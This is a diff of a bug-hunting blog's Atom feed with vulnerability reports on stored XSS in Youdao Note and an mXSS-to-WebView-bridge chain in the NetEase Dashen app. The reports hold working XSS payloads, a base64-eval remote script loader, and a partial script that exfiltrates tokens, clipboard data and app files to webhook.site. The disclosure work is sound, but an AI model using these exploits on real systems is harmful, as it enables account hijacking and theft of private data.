@@ -1,4 +1,195 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.3.3">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2024-03-04T10:39:19+08:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">sunriseXu’s bug hunting journey</title><subtitle>sunriseXu&apos;s bug hunting journey, sharing new findings of bug hunting.</subtitle><entry><title type="html">Replication: Gitlab Arbitrary file read via the bulk imports UploadsPipeline</title><link href="http://localhost:4000/path-traversal/2024/01/15/arbitrary-file-read-via-bulk-imports.html" rel="alternate" type="text/html" title="Replication: Gitlab Arbitrary file read via the bulk imports UploadsPipeline" /><published>2024-01-15T10:31:06+08:00</published><updated>2024-01-15T10:31:06+08:00</updated><id>http://localhost:4000/path-traversal/2024/01/15/arbitrary-file-read-via-bulk-imports</id><content type="html" xml:base="http://localhost:4000/path-traversal/2024/01/15/arbitrary-file-read-via-bulk-imports.html"><![CDATA[<h2 id="name">Name</h2>
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.3.3">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2024-03-19T08:48:10+08:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">sunriseXu’s bug hunting journey</title><subtitle>sunriseXu&apos;s bug hunting journey, sharing new findings of bug hunting.</subtitle><entry><title type="html">中危：有道云笔记网页端渲染流程图存在存储型XSS漏洞</title><link href="http://localhost:4000/xss/2024/03/17/xss-drawio.html" rel="alternate" type="text/html" title="中危：有道云笔记网页端渲染流程图存在存储型XSS漏洞" /><published>2024-03-17T10:26:18+08:00</published><updated>2024-03-17T10:26:18+08:00</updated><id>http://localhost:4000/xss/2024/03/17/xss-drawio</id><content type="html" xml:base="http://localhost:4000/xss/2024/03/17/xss-drawio.html"><![CDATA[<h2 id="name">Name</h2>
+
+<blockquote>
+  <p>有道云笔记网页端渲染流程图存在存储型XSS漏洞</p>
+</blockquote>
+
+<h2 id="weakness">Weakness</h2>
+<blockquote>
+  <p>存储型XSS</p>
+</blockquote>
+
+<h2 id="severity">Severity</h2>
+<blockquote>
+  <p>中危</p>
+</blockquote>
+
+<h2 id="url">URL</h2>
+<ul>
+  <li>POC网页: <a href="https://note.youdao.com/s/QJo17hDz">https://note.youdao.com/s/QJo17hDz</a></li>
+  <li>视频链接：POC视频链接：<a href="https://pan.baidu.com/s/1nkL49AiaSa4YiRXic_qcLQ">https://pan.baidu.com/s/1nkL49AiaSa4YiRXic_qcLQ</a> 提取码：1314</li>
+</ul>
+
+<h2 id="key-payload">Key Payload</h2>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;mxfile host="Electron" modified="2022-05-01T12:59:04.467Z" agent="5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) draw.io/17.4.2 Chrome/100.0.4896.60 Electron/18.0.1 Safari/537.36" etag="kiR_NjkTd37TBbovy8cU" compressed="false" version="17.4.2" type="device"&gt;
+  &lt;diagram id="_Y4cO9PIdA5klW6TnyFV" name="Page-1"&gt;
+    &lt;mxGraphModel dx="1102" dy="714" grid="1" gridSize="10" guides="1" tooltips="1" connect="1" arrows="1" fold="1" page="1" pageScale="1" pageWidth="291" pageHeight="413" math="0" shadow="0"&gt;
+      &lt;root&gt;
+        &lt;mxCell id="0" /&gt;
+        &lt;mxCell id="1" parent="0" /&gt;
+        &lt;UserObject label="&amp;lt;select&gt;&amp;lt;iframe&gt;&amp;lt;/select&gt;&amp;lt;img src=x onerror=alert(document.domain)&gt;" tooltip="" id="kX_el6IuBEZSOJuKbBye-1"&gt;
+          &lt;mxCell style="rounded=0;whiteSpace=wrap;html=1;" vertex="1" parent="1"&gt;
+            &lt;mxGeometry x="150" y="170" width="90" height="40" as="geometry" /&gt;
+          &lt;/mxCell&gt;
+        &lt;/UserObject&gt;
+      &lt;/root&gt;
+    &lt;/mxGraphModel&gt;
+  &lt;/diagram&gt;
+&lt;/mxfile&gt;
+</code></pre></div></div>
+
+<h2 id="summary">Summary</h2>
+
+<p>网易有道云笔记可以上传流程图笔记，该笔记是xml格式的drawio文件。有道云笔记采用drawio插件对该文件进行渲染，然而，该插件版本过时并且存在存储型XSS漏洞。由于笔记可以分享，将分享链接发送给受害者后，即可控制受害者客户端，由此能够获取受害者的所有笔记和笔记内容，造成严重的用户隐私数据泄露。</p>
+
+<h3 id="detail">Detail</h3>
+
+<h4 id="trigger">Trigger</h4>
+<ol>
+  <li>
+    <p>将下面payload保存为drawio文件，命名为xss.drawio。</p>
+
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> &lt;mxfile host="Electron" modified="2022-05-01T12:59:04.467Z" agent="5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) draw.io/17.4.2 Chrome/100.0.4896.60 Electron/18.0.1 Safari/537.36" etag="kiR_NjkTd37TBbovy8cU" compressed="false" version="17.4.2" type="device"&gt;
+ &lt;diagram id="_Y4cO9PIdA5klW6TnyFV" name="Page-1"&gt;
+     &lt;mxGraphModel dx="1102" dy="714" grid="1" gridSize="10" guides="1" tooltips="1" connect="1" arrows="1" fold="1" page="1" pageScale="1" pageWidth="291" pageHeight="413" math="0" shadow="0"&gt;
+     &lt;root&gt;
+         &lt;mxCell id="0" /&gt;
+         &lt;mxCell id="1" parent="0" /&gt;
+         &lt;UserObject label="&amp;lt;select&gt;&amp;lt;iframe&gt;&amp;lt;/select&gt;&amp;lt;img src=x onerror=alert(document.domain)&gt;" tooltip="" id="kX_el6IuBEZSOJuKbBye-1"&gt;
+         &lt;mxCell style="rounded=0;whiteSpace=wrap;html=1;" vertex="1" parent="1"&gt;
+             &lt;mxGeometry x="150" y="170" width="90" height="40" as="geometry" /&gt;
+         &lt;/mxCell&gt;
+         &lt;/UserObject&gt;
+     &lt;/root&gt;
+     &lt;/mxGraphModel&gt;
+ &lt;/diagram&gt;
+ &lt;/mxfile&gt;
+</code></pre></div>    </div>
+  </li>
+  <li>
+    <p>登录有道云笔记，<a href="https://note.youdao.com/">https://note.youdao.com/</a>. 点击左上侧“新建”，选择“上传文件”，将上一步的文件上传。</p>
+
+    <p><img src="/assets/images/youdaoyun2/save.png" alt="save" /></p>
+  </li>
+  <li>
+    <p>上传后，打开上传的流程图，xss触发。</p>
+
+    <p><img src="/assets/images/youdaoyun2/drawxss.png" alt="drawxss" /></p>
+  </li>
+  <li>
+    <p>将该笔记分享，发送给受害者打开，同样触发xss。</p>
+
+    <p><img src="/assets/images/youdaoyun2/share.png" alt="share" /></p>
+  </li>
+  <li>
+    <p>原因：drawio原始文件中，没有对UserObject元素的label字段进行过滤，导致label字段的xss得到执行。详见：<a href="https://github.com/jgraph/drawio/discussions/2791">https://github.com/jgraph/drawio/discussions/2791</a></p>
+  </li>
+</ol>
+
+<h3 id="proof">Proof</h3>
+<p>请提供截图或视频</p>
+
+<p>POC视频链接：<a href="https://pan.baidu.com/s/1nkL49AiaSa4YiRXic_qcLQ">https://pan.baidu.com/s/1nkL49AiaSa4YiRXic_qcLQ</a>
+提取码：1314</p>
+
+<h2 id="impact">Impact</h2>
+
+<p>该漏洞影响点击分享链接的用户，攻击者可以注入xss脚本获取受害者所有笔记ID和笔记内容，造成严重的敏感信息泄露。</p>
+
+<h2 id="patch-advice">Patch advice</h2>
+
+<ol>
+  <li>升级渲染drawio的插件到最新版本</li>
+</ol>]]></content><author><name></name></author><category term="xss" /><summary type="html"><![CDATA[Name]]></summary></entry><entry><title type="html">中危：有道云笔记markdown模式渲染类图(classDiagram)存储型XSS漏洞</title><link href="http://localhost:4000/xss/2024/03/16/xss-milkdown.html" rel="alternate" type="text/html" title="中危：有道云笔记markdown模式渲染类图(classDiagram)存储型XSS漏洞" /><published>2024-03-16T10:26:18+08:00</published><updated>2024-03-16T10:26:18+08:00</updated><id>http://localhost:4000/xss/2024/03/16/xss-milkdown</id><content type="html" xml:base="http://localhost:4000/xss/2024/03/16/xss-milkdown.html"><![CDATA[<h2 id="name">Name</h2>
+
+<blockquote>
+  <p>网易有道云笔记markdown模式渲染classDiagram存在存储型XSS漏洞</p>
+</blockquote>
+
+<h2 id="weakness">Weakness</h2>
+<blockquote>
+  <p>存储型XSS</p>
+</blockquote>
+
+<h2 id="severity">Severity</h2>
+<blockquote>
+  <p>中危</p>
+</blockquote>
+
+<h2 id="url">URL</h2>
+<ul>
+  <li>POC网页: <a href="https://note.youdao.com/s/2mc9Wfft">https://note.youdao.com/s/2mc9Wfft</a></li>
+  <li>视频链接：POC视频链接：<a href="https://pan.baidu.com/s/1GHxB356yrwWsILMcGRzk4A">https://pan.baidu.com/s/1GHxB356yrwWsILMcGRzk4A</a> 提取码：1314</li>
+</ul>
+
+<h2 id="key-payload">Key Payload</h2>
+
+<h2 id="summary">Summary</h2>
+
+<p>网易有道云笔记可以创建markdown笔记，该笔记中可插入mermaid类图。在构建过程中，该种类图的节点名称可以注入xss payload，milkdown插件未将该payload进行过滤，而是直接渲染执行，造成存储型xss攻击。由于笔记可以分享，将分享链接发送给受害者后，即可控制受害者客户端，由此能够获取受害者的所有笔记和笔记内容，造成严重的用户隐私数据泄露。</p>
+
+<h3 id="detail">Detail</h3>
+
+<h4 id="trigger">Trigger</h4>
+<ol>
+  <li>
+    <p>登录有道云笔记，<a href="https://note.youdao.com/">https://note.youdao.com/</a>. 点击左上侧“新建”，选择“Markdown”。</p>
+
+    <p><img src="/assets/images/youdaoyun/new-note.png" alt="newnote" /></p>
+  </li>
+  <li>
+    <p>进入markdown笔记编辑器，点击“更多”，下拉菜单选择“类图”。</p>
+
+    <p><img src="/assets/images/youdaoyun/more.png" alt="more" /></p>
+  </li>
+  <li>
+    <p>在类图的代码构建框中，填入以下payload，随即出现xss弹框。注意，xss在类图的节点名称中得到注入。</p>
+
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> classDiagram
+ Class01 &lt;|-- `AveryLongClass&lt;img src='x' onerror=alert(document.domain)&gt;`
+ Class03 *-- Class04
+ Class05 o-- Class06
+ Class07 .. Class08
+ Class01 : size()
+ Class01 : int chimp
+ Class01 : int gorilla
+</code></pre></div>    </div>
+    <p>xss弹框触发：</p>
+
+    <p><img src="/assets/images/youdaoyun/xss.png" alt="xss" /></p>
+  </li>
+  <li>
+    <p>点击右上角分享按钮，生成分享链接。在新窗口打开分享的笔记链接，xss同样触发。</p>
+
+    <p>分享笔记：</p>
+
+    <p><img src="/assets/images/youdaoyun/share.png" alt="share" /></p>
+
+    <p>打开分享的笔记：</p>
+
+    <p><img src="/assets/images/youdaoyun/share-xss.png" alt="sharexss" /></p>
+  </li>
+  <li>
+    <p>原因：Milkdown第三方插件的漏洞，经过测试在milkdown最新版本v7.3.5得到验证。已在官方仓库提交漏洞issue。详见：<a href="https://github.com/Milkdown/milkdown/issues/1267">https://github.com/Milkdown/milkdown/issues/1267</a></p>
+  </li>
+</ol>
+
+<h3 id="proof">Proof</h3>
+<p>请提供截图或视频</p>
+
+<p>POC视频链接：<a href="https://pan.baidu.com/s/1GHxB356yrwWsILMcGRzk4A">https://pan.baidu.com/s/1GHxB356yrwWsILMcGRzk4A</a>
+提取码：1314</p>
+
+<h2 id="impact">Impact</h2>
+
+<p>该漏洞影响点击分享链接的用户，攻击者可以注入xss脚本获取受害者所有笔记ID和笔记内容，造成严重的敏感信息泄露。</p>
+
+<h2 id="patch-advice">Patch advice</h2>
+
+<ol>
+  <li>对类图的node名称进行xss过滤</li>
+</ol>]]></content><author><name></name></author><category term="xss" /><summary type="html"><![CDATA[Name]]></summary></entry><entry><title type="html">Replication: Gitlab Arbitrary file read via the bulk imports UploadsPipeline</title><link href="http://localhost:4000/path-traversal/2024/01/15/arbitrary-file-read-via-bulk-imports.html" rel="alternate" type="text/html" title="Replication: Gitlab Arbitrary file read via the bulk imports UploadsPipeline" /><published>2024-01-15T10:31:06+08:00</published><updated>2024-01-15T10:31:06+08:00</updated><id>http://localhost:4000/path-traversal/2024/01/15/arbitrary-file-read-via-bulk-imports</id><content type="html" xml:base="http://localhost:4000/path-traversal/2024/01/15/arbitrary-file-read-via-bulk-imports.html"><![CDATA[<h2 id="name">Name</h2>
 
 <blockquote>
   <p>Gitlab Arbitrary file read via the bulk imports UploadsPipeline</p>
@@ -1824,679 +2015,4 @@ end
 
     <p>后端的controller方法中，如果creat_params方法没有对数据进行过滤，那么后端很可能不会过滤。</p>
   </li>
-</ul>]]></content><author><name></name></author><category term="xss" /><summary type="html"><![CDATA[Name]]></summary></entry><entry><title type="html">高危：网易大神手机客户端Webview mxss漏洞</title><link href="http://localhost:4000/xss/jsinterface/2023/10/20/xss-dompurify.html" rel="alternate" type="text/html" title="高危：网易大神手机客户端Webview mxss漏洞" /><published>2023-10-20T10:26:18+08:00</published><updated>2023-10-20T10:26:18+08:00</updated><id>http://localhost:4000/xss/jsinterface/2023/10/20/xss-dompurify</id><content type="html" xml:base="http://localhost:4000/xss/jsinterface/2023/10/20/xss-dompurify.html"><![CDATA[<h2 id="name">Name</h2>
-
-<blockquote>
-  <p>网易大神手机客户端存在Webview mxss漏洞，串连不安全的JS interface接口，实现用户敏感信息搜集、账户劫持(请求token泄露)和手机文件上传。这个js interface是注入的，每个打开的网站都能够访问到，但是只有163.com域名能合法调用。因此在163.com域名下找到xss就行。</p>
-</blockquote>
-
-<h2 id="weakness">Weakness</h2>
-<blockquote>
-  <p>存储型XSS，文件上传，敏感信息收集</p>
-</blockquote>
-
-<h2 id="severity">Severity</h2>
-<blockquote>
-  <p>高危</p>
-</blockquote>
-
-<h2 id="url">URL</h2>
-
-<ul>
-  <li>POC网页 https://m.ds.163.com/square/63ea17eec8dc9d00019266fe/?type=%E6%9C%80%E6%96%B0%E8%AE%A8%E8%AE%BA 使用chrome手机模式查看，打开后在终端自动打印mxss by 0x5r33!!!</li>
-  <li>视频链接：链接：https://pan.baidu.com/s/1ujV4aKjagPCMNhhxELePgg 提取码：1314</li>
-</ul>
-
-<h2 id="key-payload">Key Payload</h2>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>payload: &lt;math&gt;&lt;mtext&gt;&lt;option&gt;&lt;FAKEFAKE&gt;&lt;option&gt;&lt;/option&gt;&lt;mglyph&gt;&lt;svg&gt;&lt;mtext&gt;&lt;textarea&gt;&lt;a title="&lt;/textarea&gt;&lt;svg onload=alert(document.domain)&gt;"&gt;
-
-payload2：&lt;math&gt;&lt;mtext&gt;&lt;option&gt;&lt;FAKEFAKE&gt;&lt;option&gt;&lt;/option&gt;&lt;mglyph&gt;&lt;svg&gt;&lt;mtext&gt;&lt;textarea&gt;&lt;a title="&lt;/textarea&gt;&lt;svg onload=eval(atob('Y29uc29sZS5sb2coJ214c3MgYnkgMHg1cjMzISEhJyk7dmFyIHNjcmlwdD1kb2N1bWVudC5jcmVhdGVFbGVtZW50KCdzY3JpcHQnKTtzY3JpcHQuc3JjPSdodHRwczovL3VyY2hpbi5ub3Nkbi4xMjcubmV0L3lzJTJGMDcwYjA4MjUyZGIzNDhhMmJlMjU0NDI3MjIzYzEzMTknO2RvY3VtZW50LmdldEVsZW1lbnRzQnlUYWdOYW1lKCdib2R5JylbMF0uYXBwZW5kQ2hpbGQoc2NyaXB0KTs='))&gt;"&gt;
-
-POC: https://m.ds.163.com/square/63ea17eec8dc9d00019266fe/?type=%E6%9C%80%E6%96%B0%E8%AE%A8%E8%AE%BA 使用chrome手机模式查看，打开后在终端自动打印mxss by 0x5r33!!!
-</code></pre></div></div>
-
-<h2 id="summary">Summary</h2>
-<p>网易大神客户端中，没有对用户发帖进行过滤，全靠手机版网页前端进行过滤，由于手机版网页前端使用了不安全的dompurify组件，该组件受到mXSS（突变型XSS）攻击，导致攻击者能够绕过该组件的过滤，从而在网页上嵌入XSS代码。而该手机版网页通过大神内置的webview进行访问后，xss能够获取客户端暴露的webview javascript interface接口。而该类接口暴露了用户敏感信息例如手机号、请求token、粘贴板数据，更为严重的是暴露了客户端的文件读取接口，攻击者能够读取用户手机指定文件，包括外置存储卡文件和网易大神的私有文件，照成更严重的信息泄漏，不外乎大神应用的数据库、sharedprefs等，造成潜在的账户劫持。</p>
-
-<h3 id="detail">Detail</h3>
-<p>请按照逻辑对漏洞复现进行描述，提供危害说明和测试步骤。若使用工具复现漏洞，应提供工具详情</p>
-<h4 id="trigger">Trigger</h4>
-<ol>
-  <li>
-    <p>进入大神网页版https://ds.163.com/，然后用chrome模拟手机端，刷新后，网页自动跳转到手机端网址：https://m.ds.163.com/</p>
-
-    <p><img src="/assets/images/home.png" alt="home" /></p>
-
-    <p>选择一个游戏栏目，为了测试选一个冷门游戏”岐风之旅”，因为发帖较少，发的贴子都能置顶。</p>
-
-    <p><img src="/assets/images/qifeng.png" alt="qifeng" /></p>
-  </li>
-  <li>
-    <p>打开最新版网易大神客户端，注册并登录账号。登录后切换到主页，选择游戏圈子”岐风之旅”，并且进行发帖测试。</p>
-
-    <p>登录</p>
-
-    <p><img src="/assets/images/login.png" alt="login" /></p>
-
-    <p>切换到主页，选择游戏圈子”岐风之旅”栏目</p>
-
-    <p><img src="/assets/images/switch.png" alt="switch" />
- <img src="/assets/images/switch2.png" alt="switch2" /></p>
-
-    <p>发帖测试</p>
-
-    <p><img src="/assets/images/post1.png" alt="post1" />
- <img src="/assets/images/post2.png" alt="post2" /></p>
-
-    <p>尝试发送html标签，输入 <b>hello</b></p>
-
-    <p><img src="/assets/images/sendpost.png" alt="sendpost" /></p>
-  </li>
-  <li>
-    <p>打开第一步中的手机端网页,chrome用切换到手机模式 https://m.ds.163.com/square/63ea17eec8dc9d00019266fe/?type=%E6%9C%80%E6%96%B0%E8%AE%A8%E8%AE%BA 发现 hello 被加粗了，说明该网页能嵌入html代码。</p>
-
-    <p><img src="/assets/images/hellotest.png" alt="hellotest" /></p>
-  </li>
-  <li>
-    <p>开始debug，通过chrome插件Untrusted types(domXss调试利器)可以定位到我们的输入<b>hello</b>被直接赋值给了innerHTML。并且通过调用堆栈，笔者定位到前端在某阶段对用户输入进行了过滤，过滤组件采用的是大名鼎鼎的DomPurify，版本为2.0.12。</p>
-
-    <p><img src="/assets/images/untrusted.png" alt="untrusted" /></p>
-
-    <p>dompurify的过滤，代码位置：https://g.166.net/res/a19/86e9c93c4b0297736ba7.js text = E.sanitize(text, {FORBID_TAGS: [“style”]})</p>
-
-    <p><img src="/assets/images/sanitize.png" alt="sanitize" /></p>
-
-    <p>查看dompurify的版本为：2.0.12</p>
-
-    <p><img src="/assets/images/dompurifyversion.png" alt="dompurifyversion" /></p>
-  </li>
-  <li>
-    <p>查询得知该dompurify版本存在mXSS攻击，mXSS攻击的原理是利用math标签将html标签放置在math协议的作用域下，在html和math作用域之间切换出现不一致，导致出错。具体原理请参考以下两篇文章：</p>
-
-    <p>mxss原理解析：
- https://research.securitum.com/mutation-xss-via-mathml-mutation-dompurify-2-0-17-bypass/</p>
-
-    <p>mxss的利用：
- https://blog.vidocsecurity.com/blog/hacking-swagger-ui-from-xss-to-account-takeovers/#how-to-find-swagger-ui-at-scale</p>
-  </li>
-  <li>
-    <p>通过上面的第二篇参考文章，笔者很快构造好了xss payload，如下。进行发帖测试后，刷新手机版网页，弹出成功出现。</p>
-
-    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> &lt;math&gt;&lt;mtext&gt;&lt;option&gt;&lt;FAKEFAKE&gt;&lt;option&gt;&lt;/option&gt;&lt;mglyph&gt;&lt;svg&gt;&lt;mtext&gt;&lt;textarea&gt;&lt;a title="&lt;/textarea&gt;&lt;svg onload=alert(document.domain)&gt;"&gt;
-</code></pre></div>    </div>
-
-    <p>将该payload通过前述步骤发帖：</p>
-
-    <p><img src="/assets/images/mxss.png" alt="mxss" /></p>
-
-    <p>下断点调试看到，执行完sanitize函数后，结果依然包含xss payload:</p>
-
-    <p><img src="/assets/images/mxsspayload.png" alt="mxsspayload" /></p>
-
-    <p>弹窗出现：</p>
-
-    <p><img src="/assets/images/mxssalert.png" alt="mxssalert" /></p>
-  </li>
-  <li>
-    <p>客户端webview xss，打开大神客户端，选择任意频道发消息，将该mxss链接发送到群里。受害者点击后，mxss在客户端的webview中执行。</p>
-
-    <p>发送恶意链接：</p>
-
-    <p><img src="/assets/images/mxsslink.png" alt="mxsslink" /></p>
-
-    <p>点击该链接，大神用webview打开，弹框执行：</p>
-
-    <p><img src="/assets/images/webviewxss.png" alt="webviewxss" /></p>
-  </li>
-  <li>
-    <p>使用chrome device调试大神app的webview，这里需要手机root并且安装WebviewPP Edxposed模块，开启应用webview调试。</p>
-
-    <p>usb连接电脑，在chrome上使用chrome://device开启webview调试</p>
-
-    <p><img src="/assets/images/webviewdebug.png" alt="webviewdebug" /></p>
-
-    <p>调试页面</p>
-
-    <p><img src="/assets/images/webviewdebug2.png" alt="webviewdebug2" /></p>
-  </li>
-  <li>
-    <p>可以查看webview暴露的JavaScript interface，WebViewJavascriptBridge模块。并且在”个人中心-绑定cc页面”找到该模块的完整用法。</p>
-
-    <p>WebViewJavascriptBridge模块</p>
-
-    <p><img src="/assets/images/jsinterface.png" alt="jsinterface" /></p>
-
-    <p>从另一个页面找到该模块的完整用法，该webview的js端为：https://g.166.net/opd/ds-js-sdk/0.16.0/ds-js-sdk.min.js</p>
-
-    <p><img src="/assets/images/bindcc.png" alt="bindcc" /></p>
-
-    <p>搜索WebViewJavascriptBridge模块的函数关键字callHandler，定位到该webview js interface的所有用法。</p>
-
-    <p><img src="/assets/images/bindcc2.png" alt="bindcc2" /></p>
-  </li>
-  <li>
-    <p>漏洞利用：暴露用户敏感信息</p>
-
-    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>//获取手机客户端用户信息，包括手机号，用户id
-WebViewJavascriptBridge.callHandler("getLogField", {iosVersion: "1.4.0",androidVersion: "1.4.0",upgrade: 0},function(e){console.log(e)})
-</code></pre></div>    </div>
-
-    <p><img src="/assets/images/getuserinfo.png" alt="getuserinfo" /></p>
-  </li>
-  <li>
-    <p>漏洞利用：获取token信息</p>
-
-    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>//获取token信息
-WebViewJavascriptBridge.callHandler("getGodlikeInfo", {iosVersion: "1.4.0",androidVersion: "1.4.0",upgrade: 0},function(e){console.log(e)})
-</code></pre></div>    </div>
-
-    <p><img src="/assets/images/gettoken.png" alt="gettoken" /></p>
-
-    <p>利用token信息伪造受害者发消息请求成功：</p>
-
-    <p><img src="/assets/images/gettoken2.png" alt="gettoken2" /></p>
-  </li>
-  <li>
-    <p>漏洞利用：获取粘贴板内容</p>
-
-    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>//获取粘贴板内容
-WebViewJavascriptBridge.callHandler("getClipboardData", {iosVersion: "1.4.0",androidVersion: "1.4.0",upgrade: 0,params:{type:"text/plain"}},function(e){console.log(e)})
-</code></pre></div>    </div>
-
-    <p><img src="/assets/images/clipboard.png" alt="clipboard" /></p>
-  </li>
-  <li>
-    <p>漏洞利用：上传文件攻击，上传指定文件，包括受害者数据库，share_prefs等，sdcard上的任何已知文件。由于无法遍历文件夹列表，因此只能指定文件上传，即使这样，也由足够的文件量，例如微信的外置存储相关的特征文件等。</p>
-
-    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>//下载文件/图片，可以是本地路径，返回文件id，高危！！！！！！
-WebViewJavascriptBridge.callHandler("downloadImage", {iosVersion: "1.5.3",androidVersion: "1.5.3",upgrade: 0,params:{url:"/data/data/com.netease.gl/databases/auth",isShowProgressTips:1}},function(res){
-    console.log(res)
-    console.log("upload file:", "/data/data/com.netease.gl/databases/auth")
-    if(res.code==200){
-        var localId = res.result.localId;
-        //上传文件/图片，可以是本地路径，高危！！！！！配合上一步的文件id，完成文件上传，上传到网易云中
-        WebViewJavascriptBridge.callHandler("uploadImage", {iosVersion: "1.5.3",androidVersion: "1.5.3",upgrade: 0,params:{localId:localId,isShowProgressTips:1,usageType:1}},function(res2){
-            if(res2.code==200){
-                var downloadUrl = res2.result.url
-                console.log("downloadUrl:", downloadUrl)
-            }
-            })
-    }
-    })
-</code></pre></div>    </div>
-
-    <p>上传图片文件：</p>
-
-    <p><img src="/assets/images/fileupload.png" alt="fileupload" /></p>
-
-    <p>上传非图片文件，例如：/data/data/com.netease.gl/databases/chat_b1fbb501020c46ff88577a3fe103c0ec 为用户的聊天数据库，文件名替换成受害者的uid即可</p>
-
-    <p><img src="/assets/images/fileupload2.png" alt="fileupload" /></p>
-  </li>
-  <li>
-    <p>完整的js interface利用列表如下：</p>
-
-    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>//获取token信息
-WebViewJavascriptBridge.callHandler("getGodlikeInfo", {iosVersion: "1.4.0",androidVersion: "1.4.0",upgrade: 0},function(e){console.log(e)})
-
-//获取手机客户端用户信息，包括手机号，用户id
-WebViewJavascriptBridge.callHandler("getLogField", {iosVersion: "1.4.0",androidVersion: "1.4.0",upgrade: 0},function(e){console.log(e)})
-
-//判断应用是否安装
-WebViewJavascriptBridge.callHandler("launchApp", {iosVersion: "1.4.0",androidVersion: "1.4.0",upgrade: 0,params:{iosSchemeProtocol:"",androidPackageName:"com.android.traceur"}},function(e){console.log(e)})
-
-//启动应用
-WebViewJavascriptBridge.callHandler("launchApp", {iosVersion: "1.4.0",androidVersion: "1.4.0",upgrade: 0,params:{iosSchemeProtocol:"",androidPackageName:"im.yixin",iosDownloadUrl:"",iosStoreKitITunesItemId:"",iosStoreKitAffiliateToken:"10lxv5",iosStoreKitCampaignToken:"gl-jssdk"}},function(e){console.log(e)})
-
-//控制粘贴板内容
-WebViewJavascriptBridge.callHandler("doCopy", {iosVersion: "1.4.0",androidVersion: "1.4.0",upgrade: 0,params:{text:"gl-jssdk"}},function(e){console.log(e)})
-
-//获取粘贴板内容
-WebViewJavascriptBridge.callHandler("getClipboardData", {iosVersion: "1.4.0",androidVersion: "1.4.0",upgrade: 0,params:{type:"text/plain"}},function(e){console.log(e)})
-
-//关注他人
-WebViewJavascriptBridge.callHandler("followUser", {iosVersion: "1.4.0",androidVersion: "1.4.0",upgrade: 0,params:{uid:"fb79313773894347bca73424dedf7913"}},function(e){console.log(e)})
-
-//打开相册
-WebViewJavascriptBridge.callHandler("chooseImage", {iosVersion: "1.5.3",androidVersion: "1.5.3",upgrade: 0,params:{count:9,source:"album",front:1,credentialsType:0,credentialsTips:"",waterMarkText:"",waterMarkPosition:"bottomCenter"}},function(e){console.log(e)})
-
-//下载文件/图片，可以是本地路径，返回文件id，高危！！！！！！
-WebViewJavascriptBridge.callHandler("downloadImage", {iosVersion: "1.5.3",androidVersion: "1.5.3",upgrade: 0,params:{url:"/sdcard/Pictures/aa.jpg",isShowProgressTips:1}},function(e){console.log(e)})
-
-//上传文件/图片，可以是本地路径，高危！！！！！配合上一步的文件id，完成文件上传，上传到网易云中
-WebViewJavascriptBridge.callHandler("uploadImage", {iosVersion: "1.5.3",androidVersion: "1.5.3",upgrade: 0,params:{localId:"godlike://resourceid/9f64aebdfff3ef5abd0f1365b08f0fc7",isShowProgressTips:1,usageType:1}},function(e){console.log(e)})
-
-//或者直接读取文件
-WebViewJavascriptBridge.callHandler("getLocalImageData", {iosVersion: "1.5.3",androidVersion: "1.5.3",upgrade: 0,params:{localId:"godlike://resourceid/6e37e47d1b0874c42a31e80e654b39a7"}},function(e){console.log(e)})
-</code></pre></div>    </div>
-  </li>
-  <li>
-    <p>将上述漏洞利用脚本化，将受害者的敏感信息，文件url，粘贴板数据等回传到攻击者控制的burpsuite collaborator。</p>
-
-    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>// burpsuite collaborator url
-const api_burp = 'http://webhook.site/09f1dce5-7edb-403d-807b-3fe4a54e9d4c'
-
-console.log("mxss触发 by 0x5r33!!!!")
-// 通过img src来向burpsuite collaborator url外送敏感新信息
-const justSend = async url =&gt; {
-    var Img = new Image
-    Img.src = url
-}
-
-// base64 加解密
-const encode = str =&gt; {
-    var b64 = btoa(unescape(encodeURIComponent(str)))
-    return b64
-}
-const decode = str =&gt; {
-    var str = decodeURIComponent(escape(atob(str)));
-    return str
-}
-//获取敏感信息
-const sendData = () =&gt; {
-    WebViewJavascriptBridge.init()
-    var usrInfo, tokenInfo, clipData, fileData;
-    //获取手机客户端用户信息，包括手机号，用户id
-    WebViewJavascriptBridge.callHandler("getLogField", 
-        {iosVersion: "1.4.0",androidVersion: "1.4.0",upgrade: 0},
-        function(e){
-            if(e.code==200){
-                usrInfo = e.result;
-                console.log("获取用户数据成功！！！")
-            }
-        }
-    )
-    //获取token信息
-    WebViewJavascriptBridge.callHandler("getGodlikeInfo", 
-        {iosVersion: "1.4.0",androidVersion: "1.4.0",upgrade: 0},
-        function(e){
-            if(e.code==200){
-                tokenInfo = e.result;
-                console.log("获取token成功！！！")
-            }
-                
-        }
-    )
-
-    WebViewJavascriptBridge.callHandler("getClipboardData", 
-        {iosVersion: "1.4.0",androidVersion: "1.4.0",upgrade: 0,params:{type:"text/plain"}},
-        function(e){
-            if(e.code==200){
-                clipData = e.result;
-                console.log("获取粘贴板成功！！！")
-            }
-        }
-    )
-
-    //下载文件/图片，可以是本地路径，返回文件id，高危！！！！！！
-    WebViewJavascriptBridge.callHandler("downloadImage", 
